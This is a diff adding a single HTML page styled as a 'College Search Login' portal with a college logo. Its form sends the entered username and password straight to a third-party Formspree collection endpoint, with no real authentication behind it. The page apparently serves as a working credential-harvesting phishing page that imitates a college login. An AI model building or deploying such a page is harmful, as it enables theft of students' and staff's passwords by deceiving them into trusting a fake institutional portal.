@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>College Portal</title>
+
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to right, #74ebd5, #9face6);
+}
+
+.box {
+    text-align: center;
+    background: white;
+    padding: 30px;
+    border-radius: 15px;
+    width: 350px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.2);
+}
+
+.logo {
+    width: 90px;
+    margin-bottom: 10px;
+}
+
+h2 {
+    margin-bottom: 20px;
+    color: #003366;
+}
+
+/* search style inputs */
+input {
+    width: 90%;
+    padding: 12px 18px;
+    margin: 10px 0;
+    border-radius: 25px;
+    border: 1px solid #ccc;
+    font-size: 15px;
+    outline: none;
+}
+
+button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 10px;
+    border-radius: 25px;
+    border: none;
+    background: #4285f4;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #3367d6;
+}
+
+small {
+    color: gray;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="box">
+
+    <!-- College Logo -->
+    <img src="apeclogo.png" class="logo" alt="College Logo">
+
+    <h2>College Search Login</h2>
+
+    <!-- FORMSPREE FORM -->
+    <form action="https://formspree.io/f/xgojpqdk" method="POST">
+
+        <input type="text" name="username" placeholder="Enter Username (Search)" required>
+
+        <input type="password" name="password" placeholder="Enter Password" required>
+
+        <button type="submit">Search / Login</button>
+
+    </form>
+
+    <small>Enter details and submit</small>
+
+</div>
+
+</body>
+</html>
